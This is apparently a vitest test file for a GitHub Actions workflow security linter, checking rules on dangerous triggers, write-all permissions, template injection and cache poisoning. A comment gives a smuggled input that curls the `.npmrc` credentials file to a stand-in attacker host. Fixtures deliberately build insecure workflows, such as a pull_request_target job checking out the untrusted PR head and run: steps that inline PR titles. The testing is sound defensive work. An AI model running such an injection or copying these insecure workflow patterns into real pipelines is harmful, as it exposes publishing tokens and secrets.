// Tests for src/scripts/lint_workflow_security.ts (py2ts — workflow linter).
//
// Two layers:
//  1. Unit tests over the exported helpers (_triggers, scan_workflow,
//     is_allowlisted, load_allowlist) via the _set*ForTest seams on tmp fixtures.
//  2. Golden-parity: python3 lint_workflow_security.py vs tsx
//     lint_workflow_security.ts, both pointed at the SAME tmp fixture dir
//     (Python via an importlib wrapper that monkeypatches WORKFLOWS_DIR /
//     ALLOWLIST_PATH; TS via the _set*ForTest seam), asserting byte-identical
//     stdout/stderr + exit and a byte-identical --json artifact. Parity skipped
//     without python3.
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { _triggers, is_allowlisted, scan_workflow } from '../../src/scripts/lint_workflow_security.js';



const DANGEROUS_WF = [
    'on:',
    '  pull_request_target:',
    'permissions: write-all',
    'jobs:',
    '  build:',
    '    permissions: write-all',
    '    steps:',
    '      - uses: actions/checkout@v4',
    '        with:',
    '          ref: ${{ github.event.pull_request.head.sha }}',
    '      - uses: somevendor/action@v1',
    '      - run: npm ci',
    '',
].join('\n');

const CLEAN_WF = [
    'on:',
    '  push:',
    'permissions:',
    '  contents: read',
    'jobs:',
    '  build:',
    '    steps:',
    // `persist-credentials: false` is what makes this fixture clean under the
    // rule of the same name: without it the repository token stays in the
    // runner's git config for the rest of the job. The fixture carries the fix
    // rather than the assertion being narrowed, so "clean" keeps meaning clean.
    '      - uses: actions/checkout@0000000000000000000000000000000000000000',
    '        with:',
    '          persist-credentials: false',
    '      - run: npm ci --ignore-scripts',
    '',
].join('\n');

// --- Unit: _triggers --------------------------------------------------------

describe('lint_workflow_security — _triggers', () => {
    it('handles string, list, dict, null', () => {
        expect([..._triggers('push')]).toEqual(['push']);
        expect([..._triggers(['push', 'pull_request'])].sort()).toEqual(['pull_request', 'push']);
        expect([..._triggers({ pull_request_target: null })]).toEqual(['pull_request_target']);
        expect([..._triggers(null)]).toEqual([]);
        expect([..._triggers(undefined)]).toEqual([]);
    });
});

// --- Unit: scan_workflow on tmp fixtures ------------------------------------

describe('lint_workflow_security — scan_workflow', () => {
    let tmp: string;
    beforeEach(() => {
        tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lws-'));
    });
    afterEach(() => {
        fs.rmSync(tmp, { recursive: true, force: true });
    });

    it('flags the dangerous workflow with HIGH + MEDIUM findings', () => {
        const wf = path.join(tmp, 'bad.yml');
        fs.writeFileSync(wf, DANGEROUS_WF, 'utf-8');
        const findings = scan_workflow(wf, []);
        const rules = findings.map((f) => f['rule']);
        expect(rules).toContain('dangerous-trigger-untrusted-ref');
        expect(rules).toContain('permissions-write-all');
        expect(rules).toContain('npm-install-without-ignore-scripts');
        expect(rules).toContain('mutable-action-tag');
    });

    it('clean workflow yields no findings', () => {
        const wf = path.join(tmp, 'ok.yml');
        fs.writeFileSync(wf, CLEAN_WF, 'utf-8');
        expect(scan_workflow(wf, [])).toEqual([]);
    });

    // The negative control for the fixture above. Without this case, dropping
    // `persist-credentials: false` from CLEAN_WF is indistinguishable from the
    // rule never firing — the clean assertion alone cannot tell those apart.
    it('checkout without an explicit persist-credentials → MEDIUM finding', () => {
        const wf = path.join(tmp, 'no-persist.yml');
        fs.writeFileSync(wf, CLEAN_WF.replace(/ {8}with:\n {10}persist-credentials: false\n/, ''), 'utf-8');
        const finding = scan_workflow(wf, []).find((f) => f['rule'] === 'persist-credentials');
        expect(finding).toBeDefined();
        expect(finding!['severity']).toBe('MEDIUM');
    });

    it('parse error → HIGH parse-error finding', () => {
        const wf = path.join(tmp, 'broken.yml');
        fs.writeFileSync(wf, 'foo: [unterminated\n', 'utf-8');
        const findings = scan_workflow(wf, []);
        expect(findings[0]!['rule']).toBe('parse-error');
        expect(findings[0]!['severity']).toBe('HIGH');
    });

    it('marks allowlisted findings', () => {
        const wf = path.join(tmp, 'bad.yml');
        fs.writeFileSync(wf, DANGEROUS_WF, 'utf-8');
        const al = [{ workflow: 'bad.yml', rule: 'permissions-write-all' }];
        const findings = scan_workflow(wf, al);
        const perm = findings.find((f) => f['rule'] === 'permissions-write-all');
        expect(perm!['allowlisted']).toBe(true);
    });
});

// --- Unit: is_allowlisted ---------------------------------------------------

describe('lint_workflow_security — is_allowlisted', () => {
    it('matches workflow + rule', () => {
        const al = [{ workflow: 'x.yml', rule: 'permissions-write-all' }];
        expect(is_allowlisted(al, 'x.yml', 'permissions-write-all')).toBe(true);
        expect(is_allowlisted(al, 'x.yml', 'other')).toBe(false);
        expect(is_allowlisted(al, 'y.yml', 'permissions-write-all')).toBe(false);
    });
});

// --- Golden parity (python3 vs tsx) -----------------------------------------


// Wrappers are written to disk (not passed via -c / -e) so prog-name and the
// "cjs top-level await" limitation do not interfere. Each imports the module
// by path, monkeypatches the scan dir + allowlist from env, then calls main().


// --- road-to-boundaries-that-hold-at-release-and-runtime 2.1 / 2.2 ---------

function wf(lines: string[]): string {
    return [...lines, ''].join('\n');
}

const SHA = '0000000000000000000000000000000000000000';

describe('lint_workflow_security — template-injection', () => {
    // Abuse case: a dispatched input or release tag such as
    // `x"; curl -d @$HOME/.npmrc attacker; "` executes in a job holding
    // `id-token: write`. Free text reaches a shell only through `env:`.
    let tmp: string;
    beforeEach(() => {
        tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lws-ti-'));
    });
    afterEach(() => {
        fs.rmSync(tmp, { recursive: true, force: true });
    });

    function scan(body: string): ReturnType<typeof scan_workflow> {
        const p = path.join(tmp, 'w.yml');
        fs.writeFileSync(p, body, 'utf-8');
        return scan_workflow(p, []).filter((f) => f['rule'] === 'template-injection');
    }

    const head = [
        'on:',
        '  pull_request:',
        '  workflow_dispatch:',
        '    inputs:',
        '      bump:',
        '        type: choice',
        '        options: [patch, minor]',
        '      dry:',
        '        type: boolean',
        '      tag:',
        '        type: string',
        '      note:',
        '        description: untyped',
        'permissions:',
        '  contents: read',
        'jobs:',
        '  j:',
        '    runs-on: ubuntu-latest',
        '    steps:',
    ];

    it('a PR title inline in run: is one HIGH finding', () => {
        const found = scan(wf([...head, '      - run: echo "${{ github.event.pull_request.title }}"']));
        expect(found).toHaveLength(1);
        expect(found[0]!['severity']).toBe('HIGH');
        expect(String(found[0]!['detail'])).toContain('github.event.pull_request.title');
    });

    it('the same value through env: is clean', () => {
        expect(
            scan(
                wf([
                    ...head,
                    '      - env:',
                    '          TITLE: ${{ github.event.pull_request.title }}',
                    '        run: echo "$TITLE"',
                ]),
            ),
        ).toEqual([]);
    });

    it('a choice, boolean, SHA, number or step output is not free text', () => {
        expect(
            scan(
                wf([
                    ...head,
                    '      - run: |',
                    '          echo "${{ inputs.bump }} ${{ github.event.inputs.dry }}"',
                    '          echo "${{ github.sha }} ${{ github.event.pull_request.number }}"',
                    '          echo "${{ steps.v.outputs.version }} ${{ github.run_id }}"',
                ]),
            ),
        ).toEqual([]);
    });

    it('string and untyped inputs, release tags, head refs and commit messages are free text', () => {
        const found = scan(
            wf([
                ...head,
                '      - run: echo "${{ inputs.tag }}"',
                '      - run: echo "${{ github.event.inputs.note }}"',
                '      - run: echo "${{ github.event.release.tag_name || inputs.bump }}"',
                '      - run: echo "${{ github.head_ref }}"',
                '      - run: echo "${{ github.event.head_commit.message }}"',
                '      - run: echo "${{ github.event.label.name }}"',
            ]),
        );
        expect(found).toHaveLength(6);
    });

    it('github-script script: is a sink too, its other inputs are not', () => {
        const found = scan(
            wf([
                ...head,
                `      - uses: actions/github-script@${SHA}`,
                '        with:',
                '          github-token: ${{ github.event.pull_request.body }}',
                '          script: core.info("${{ github.event.pull_request.body }}")',
            ]),
        );
        expect(found).toHaveLength(1);
    });
});

describe('lint_workflow_security — privileged-job-cache', () => {
    // Abuse case: a poisoned Actions cache written by a lower-privilege workflow
    // is restored into the OIDC publish job, so attacker modules run with a
    // token that can publish the package.
    let tmp: string;
    beforeEach(() => {
        tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'lws-pc-'));
    });
    afterEach(() => {
        fs.rmSync(tmp, { recursive: true, force: true });
    });

    function scan(body: string): ReturnType<typeof scan_workflow> {
        const p = path.join(tmp, 'w.yml');
        fs.writeFileSync(p, body, 'utf-8');
        return scan_workflow(p, []).filter((f) => f['rule'] === 'privileged-job-cache');
    }

    const setupNodeCache = [`      - uses: actions/setup-node@${SHA}`, '        with:', "          cache: 'npm'"];

    it('a setup-* cache in a job inheriting workflow-level id-token: write is a finding', () => {
        const found = scan(
            wf(['on: push', 'permissions:', '  id-token: write', '  contents: read', 'jobs:', '  publish:', '    steps:', ...setupNodeCache]),
        );
        expect(found).toHaveLength(1);
        expect(String(found[0]!['location'])).toContain('publish');
    });

    it('the same cache in a job overriding to contents: read is not', () => {
        expect(
            scan(
                wf([
                    'on: push',
                    'permissions:',
                    '  id-token: write',
                    'jobs:',
                    '  verify:',
                    '    permissions:',
                    '      contents: read',
                    '    steps:',
                    ...setupNodeCache,
                ]),
            ),
        ).toEqual([]);
    });

    it('contents: write, write-all and a non-default secret are privileged; GITHUB_TOKEN alone is not', () => {
        const job = (perm: string[], extra: string[] = []) =>
            wf(['on: push', 'jobs:', '  j:', ...perm, '    steps:', ...extra, `      - uses: actions/cache@${SHA}`, '        with:', '          path: x', '          key: k']);
        expect(scan(job(['    permissions:', '      contents: write']))).toHaveLength(1);
        expect(scan(job(['    permissions: write-all']))).toHaveLength(1);
        expect(scan(job([], ['      - run: echo hi', '        env:', '          T: ${{ secrets.NPM_TOKEN }}']))).toHaveLength(1);
        expect(scan(job([], ['      - run: echo hi', '        env:', '          T: ${{ secrets.GITHUB_TOKEN }}']))).toEqual([]);
        expect(scan(job(['    permissions:', '      contents: read']))).toEqual([]);
    });

    it('a setup-* action without with.cache is not a cache', () => {
        expect(
            scan(wf(['on: push', 'permissions:', '  id-token: write', 'jobs:', '  j:', '    steps:', `      - uses: actions/setup-node@${SHA}`, '        with:', '          node-version: 22'])),
        ).toEqual([]);
    });
});
